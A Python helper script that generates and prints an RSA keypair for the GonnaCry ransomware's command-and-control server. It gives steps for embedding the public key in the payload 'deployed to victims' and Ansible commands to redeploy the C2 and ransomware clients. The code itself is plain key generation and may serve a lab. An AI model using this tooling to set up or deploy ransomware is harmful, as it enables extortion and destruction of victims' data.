#!/usr/bin/env python3
"""
Generate RSA-2048 server keypair for GonnaCry C2.
Run once when setting up or rotating keys.

Paste output into 3 locations (see instructions printed below).
"""

import hashlib
from Crypto.PublicKey import RSA

key = RSA.generate(2048)
private_pem = key.exportKey('PEM').decode()
public_pem  = key.publickey().exportKey('PEM').decode()
fingerprint = hashlib.sha256(public_pem.encode()).hexdigest()[:16]

print(f"Key fingerprint (changes every run): {fingerprint}")
print()
print("=" * 60)
print("PRIVATE KEY")
print("=" * 60)
print(private_pem)

print()
print("=" * 60)
print("PUBLIC KEY")
print("=" * 60)
print(public_pem)

print()
print("=" * 60)
print("PASTE INTO THESE 3 LOCATIONS:")
print("=" * 60)
print()
print("1. GonnaCry/src/Server/private_key.key")
print("   Paste the PRIVATE KEY above (replaces entire file).")
print("   Ansible copies this to C2 server at configure_c2.yml run.")
print()
print("2. GonnaCry/src/Server/public_key.key")
print("   Paste the PUBLIC KEY above (replaces entire file).")
print("   Ansible copies this to C2 server alongside private key.")
print()
print("3. GonnaCry/src/GonnaCry/variables.py  — server_public_key variable")
print("   Replace the triple-quoted block:")
print('   server_public_key = """<paste PUBLIC KEY here>"""')
print("   This key is embedded in the payload deployed to victims.")
print()
print("After updating all 3 — redeploy C2 + clients:")
print("  ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e 'project_root=$(pwd)'")
print("  ansible-playbook -i inventory/hosts.ini playbooks/deploy_gonnacry.yml -e 'project_root=$(pwd)'")
